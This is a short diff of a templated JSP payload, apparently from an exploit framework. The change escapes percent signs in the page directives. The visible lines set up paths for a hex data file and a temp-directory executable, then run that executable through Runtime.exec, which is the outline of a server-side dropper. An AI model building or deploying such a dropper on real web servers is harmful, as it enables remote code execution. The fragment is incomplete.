@@ -1,5 +1,5 @@
-<%@ page import="java.io.*" %>
-<%
+<%%@ page import="java.io.*" %%>
+<%%
 	String %{var_hexpath} = application.getRealPath("/") + "/%{var_hexfile}.txt";
 	String %{var_exepath} = System.getProperty("java.io.tmpdir") + "/%{var_exe}";
 	String %{var_data} = "";
@@ -46,4 +46,4 @@
 	{
 		Process %{var_proc} = Runtime.getRuntime().exec(%{var_exepath});
 	}
-%>
+%%>
